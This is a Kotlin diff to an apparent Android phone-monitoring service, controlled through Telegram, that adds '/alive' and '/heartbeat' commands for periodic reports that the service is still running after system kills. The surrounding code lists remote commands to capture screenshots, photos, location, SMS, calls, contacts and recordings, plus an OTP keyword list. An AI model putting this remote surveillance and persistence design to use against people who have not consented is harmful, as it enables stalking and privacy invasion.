@@ -172,9 +172,9 @@ class MonitoringService : Service() {
         private val OTP_KEYWORDS = arrayOf("otp", "kode", "verifikasi", "verification", "otentikasi", "aktivasi", "konfirmasi", "token", "password", "kata sandi")
         private val PROMO_KEYWORDS = arrayOf("promo", "diskon", "discount", "cashback", "bonus", "hadiah", "undian", "pinjaman", "kredit", "cicilan", "belanja", "sale", "gratis", "klaim", "voucher", "kupon", "poin", "tukar")
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
-        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
-        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas")
-        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
+        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/heartbeat", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas", "/alive")
+        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/alive", "/heartbeat", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
         private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val COMMAND_SILENT_AGE_SEC = 3600L
@@ -646,6 +646,7 @@ class MonitoringService : Service() {
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     monitorCycleMs = if (!cachedMonitoringPaused) syncIntervalMillis() else 15 * 60_000L
                     try { Liveness.markAlive(preferencesManager) } catch (_: Exception) { }
+                    try { maybeSendHeartbeat() } catch (_: Exception) { }
                     try { checkBatteryAlert() } catch (_: Exception) { }
                     try { maybeSendDigest() } catch (_: Exception) { }
                     try { maybeSendNightDigest() } catch (_: Exception) { }
@@ -2190,6 +2191,24 @@ class MonitoringService : Service() {
                     sendToTelegram("\u23F1\uFE0F <b>Uptime</b>\nJalan: $span\nSejak: " + formatDate(started))
                 }
             }
+            "/alive" -> {
+                sendToTelegram(aliveReportText(), mainMenu())
+            }
+            "/heartbeat" -> {
+                if (arg.isBlank()) {
+                    val hours = try { preferencesManager.heartbeatHours } catch (_: Exception) { 0 }
+                    sendToTelegram("💚 Heartbeat: " + if (hours <= 0) "mati. Pakai /heartbeat &lt;1-48&gt; untuk menyalakan." else "tiap $hours jam.")
+                } else {
+                    val hours = arg.trim().toIntOrNull()
+                    if (hours == null || hours < 0 || hours > 48) {
+                        sendToTelegram("Cara pakai: /heartbeat &lt;1-48&gt; (0 = matikan).")
+                    } else {
+                        try { preferencesManager.heartbeatHours = hours } catch (_: Exception) { }
+                        try { preferencesManager.heartbeatAt = System.currentTimeMillis() } catch (_: Exception) { }
+                        sendToTelegram(if (hours <= 0) "💚 Heartbeat dimatikan." else "💚 Heartbeat menyala: laporan tiap $hours jam.")
+                    }
+                }
+            }
             "/contacts" -> {
                 if (arg.isEmpty()) {
                     sendToTelegram("Cara pakai: /contacts &lt;name&gt;")
@@ -2509,6 +2528,8 @@ class MonitoringService : Service() {
                         appendLine("/lastnotif - notifikasi terakhir")
                         appendLine("/version - versi app + HP")
                         appendLine("/uptime - lama service jalan")
+                        appendLine("/alive - denyut terakhir + berapa kali dipulihkan")
+                        appendLine("/heartbeat &lt;1-48|0&gt; - laporan berkala masih hidup")
                         appendLine("/contacts &lt;nama&gt; - cari kontak")
                         appendLine("/apps [N] - daftar aplikasi")
                         appendLine("/storage - sisa penyimpanan")
@@ -4314,6 +4335,60 @@ class MonitoringService : Service() {
             }
         } catch (_: Exception) {
         }
+    }
+
+    private fun durationText(millis: Long): String {
+        val minutes = (millis / 60_000L).coerceAtLeast(0L)
+        val hours = minutes / 60
+        val days = hours / 24
+        return when {
+            days > 0 -> "$days d ${hours % 24} h"
+            hours > 0 -> "$hours h ${minutes % 60} m"
+            else -> "$minutes m"
+        }
+    }
+
+    private fun fgsTypesText(types: Int): String {
+        if (types == 0) return "-"
+        val names = ArrayList<String>()
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) != 0) names.add("dataSync")
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION) != 0) names.add("location")
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA) != 0) names.add("camera")
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE) != 0) names.add("mic")
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION) != 0) names.add("screen")
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE) != 0) names.add("specialUse")
+        return if (names.isEmpty()) "lain" else names.joinToString("+")
+    }
+
+    private fun aliveReportText(): String {
+        val now = System.currentTimeMillis()
+        val started = serviceStartAt
+        val lastAlive = try { preferencesManager.lastAliveAt } catch (_: Exception) { 0L }
+        val kills = try { preferencesManager.livenessKills } catch (_: Exception) { 0 }
+        val beat = try { preferencesManager.heartbeatHours } catch (_: Exception) { 0 }
+        val level = batteryLevel()
+        return buildString {
+            appendLine("💚 <b>Alive</b>")
+            appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "JEDA" else "JALAN"}")
+            appendLine("Uptime: ${if (started > 0) durationText(now - started) else "?"}")
+            if (started > 0) appendLine("Sejak: " + formatDate(started))
+            appendLine("Denyut terakhir: ${if (lastAlive > 0) durationText(now - lastAlive) + " lalu" else "?"}")
+            appendLine("Dipulihkan: ${kills}x sejak dihentikan sistem")
+            appendLine("Watchdog: tiap ~10 mnt")
+            appendLine("Heartbeat: ${if (beat > 0) "tiap $beat jam" else "mati (/heartbeat)"}")
+            appendLine("Tipe FGS aktif: " + fgsTypesText(appliedFgsTypes))
+            if (level in 0..100) appendLine("Baterai: $level%")
+        }
+    }
+
+    private suspend fun maybeSendHeartbeat() {
+        val hours = try { preferencesManager.heartbeatHours } catch (_: Exception) { 0 }
+        if (hours <= 0) return
+        val now = System.currentTimeMillis()
+        val last = try { preferencesManager.heartbeatAt } catch (_: Exception) { 0L }
+        if (last > 0L && now > last && now - last < hours * 3_600_000L) return
+        try { preferencesManager.heartbeatAt = now } catch (_: Exception) { }
+        sendToTelegram(aliveReportText())
     }
 
     private fun formatDate(timestamp: Long): String {
